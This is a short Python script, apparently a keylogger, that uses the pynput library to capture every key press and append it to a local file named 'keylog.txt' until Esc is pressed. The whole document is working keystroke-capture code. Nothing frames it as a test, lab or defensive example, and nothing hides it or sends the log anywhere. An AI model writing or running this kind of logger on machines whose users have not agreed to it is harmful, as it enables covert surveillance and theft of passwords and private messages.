import pynput
from pynput.keyboard import Key, Listener

# Set up the log file
log_file = "keylog.txt"

def on_press(key):
    # Write the pressed key to the log file
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

def on_release(key):
    # Stop the listener when the 'esc' key is pressed
    if key == Key.esc:
        return False

# Create a keyboard listener
listener = Listener(on_press=on_press, on_release=on_release)

# Start the listener
listener.start()
listener.join()